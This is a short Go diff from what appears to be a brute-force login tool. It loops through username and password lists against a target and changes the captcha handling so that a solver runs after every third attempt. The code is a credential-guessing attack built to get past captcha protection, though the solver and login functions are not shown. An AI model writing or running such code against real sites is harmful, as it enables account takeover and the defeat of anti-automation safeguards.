@@ -54,16 +54,20 @@ func main() {
 
 	//main bruteloop
 
+	var counter uint
+
 	for _, v := range userSlice {
 		for _, k := range passSlice {
 
-			if captcha.IsCaptcha(u) {
+			if counter == 3 {
 				captcha.Solver(u)
+				counter = 0
 
 			} else if brute.Orca(u, v, k) {
 				fmt.Println("Done! Found combination:  ", v, ":", k)
 				return
 			}
+			counter++
 		}
 		fmt.Println("Finished username: ", v)
 	}
